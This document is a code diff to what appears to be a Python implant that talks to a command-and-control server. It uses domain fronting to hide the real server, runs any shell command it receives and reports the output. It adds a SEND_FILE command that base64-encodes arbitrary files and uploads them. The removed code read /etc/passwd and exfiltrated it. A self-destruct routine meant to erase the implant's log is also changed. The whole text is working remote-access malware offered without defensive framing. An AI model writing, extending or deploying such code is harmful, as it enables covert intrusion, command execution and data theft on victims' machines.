@@ -5,6 +5,7 @@ import base64
 import subprocess
 import os
 import sys
+import json
 from requests.adapters import HTTPAdapter
 from urllib3.poolmanager import PoolManager
 
@@ -87,11 +88,11 @@ FRONT_DOMAIN = "127.0.0.1:8080"
 REAL_DOMAIN = "127.0.0.1:8080"         # Actual C2 server IP/domain
 UPLOAD_PATH = "/upload"
 COMMAND_PATH = "/command"
-RESULT_PATH = "/result"
+LOG_PATH = "/log"
 
 UPLOAD_URL = f"https://{FRONT_DOMAIN}{UPLOAD_PATH}"
 COMMAND_URL = f"https://{FRONT_DOMAIN}{COMMAND_PATH}"
-RESULT_URL = f"https://{FRONT_DOMAIN}{RESULT_PATH}"
+LOG_URL = f"https://{FRONT_DOMAIN}{LOG_PATH}"
 
 class SNIAdapter(HTTPAdapter):
     def __init__(self, server_hostname, *args, **kwargs):
@@ -104,6 +105,7 @@ class SNIAdapter(HTTPAdapter):
 
 def self_destruct():
     print("Initiating self-destruct sequence...")
+    return
     try:
         # Remove log file if it exists.
         log_file = "/tmp/implant.log"
@@ -128,12 +130,37 @@ def self_destruct():
     finally:
         sys.exit(0)
 
-def send_data():
+def send_log(log_message):
     try:
-        with open("/etc/passwd", "r") as file:
+        session = requests.Session()
+        adapter = SNIAdapter(server_hostname=FRONT_DOMAIN)
+        session.mount("https://", adapter)
+        headers = {"Host": REAL_DOMAIN}
+        encrypted_log = do_everything(log_message)
+        payload = {"data": encrypted_log}
+        response = session.post(LOG_URL, data=payload, headers=headers, verify=False)
+        if response.status_code == 200:
+            print("Log sent successfully")
+            return True
+        else:
+            print("Failed to send log. Status code:", response.status_code)
+            return False
+    except Exception as e:
+        print("Error sending log:", e)
+        return False
+
+def send_file(file_path):
+    try:
+        with open(file_path, "rb") as file:
             file_data = file.read()
-        
-        secret_data = do_everything(file_data)
+        file_data = base64.b64encode(file_data).decode()
+        data = {
+            "file_name": os.path.basename(file_path),
+            "file_size": len(file_data),
+            "data": file_data
+        }
+        data = json.dumps(data)
+        secret_data = do_everything(data)
         payload = {"data": secret_data}
         session = requests.Session()
         adapter = SNIAdapter(server_hostname=FRONT_DOMAIN)
@@ -141,13 +168,13 @@ def send_data():
         headers = {"Host": REAL_DOMAIN}
         response = session.post(UPLOAD_URL, data=payload, headers=headers, verify=False)
         if response.status_code == 200:
-            print("Data sent successfully")
+            print("File sent successfully")
             return True
         else:
-            print("Failed to send data. Status code:", response.status_code)
+            print("Failed to send file. Status code:", response.status_code)
             return False
     except Exception as e:
-        print("Error exfiltrating data:", e)
+        print("Error sending file:", e)
         return False
 
 def poll_command():
@@ -179,44 +206,32 @@ def execute_command(cmd):
     except subprocess.CalledProcessError as e:
         return e.output.decode()
 
-def send_result(result):
-    try:
-        session = requests.Session()
-        adapter = SNIAdapter(server_hostname=FRONT_DOMAIN)
-        session.mount("https://", adapter)
-        headers = {"Host": REAL_DOMAIN}
-
-        secret_result = do_everything(result)
-        payload = {"data": secret_result}
-        
-        response = session.post(RESULT_URL, data=payload, headers=headers, verify=False)
-        if response.status_code == 200:
-            print("Result sent successfully")
-        else:
-            print("Failed to send result. Status:", response.status_code)
-    except Exception as e:
-        print("Error sending result:", e)
-
 def main():
     fail_count = 0
     while True:
-        if not send_data():
-            fail_count += 1
-        else:
-            fail_count = 0
-
         if fail_count >= 60:
             self_destruct()
+            return
 
         cmd = poll_command()
-        if cmd:
+        if cmd is None:
+            fail_count += 1
+            print(f"Failed to poll command. Fail count:{fail_count}")
+        else:
+            fail_count = 0
             if cmd.strip() == "BIG BANG!!":
                 self_destruct()
+                return
+            elif cmd.strip().split()[0]=="SEND_FILE":
+                file_path = cmd.strip().split()[1]
+                if os.path.exists(file_path):
+                    send_file(file_path)
+                else:
+                    send_log(f"File {file_path} does not exist.")
             else:
-                print("Executing command:", cmd)
                 result = execute_command(cmd)
-                print("Command output:", result)
-                send_result(result)
+                result = f"Executed Command: {cmd}\Output:\n{result}"
+                send_log(result)
         time.sleep(15)
 
 if __name__ == '__main__':
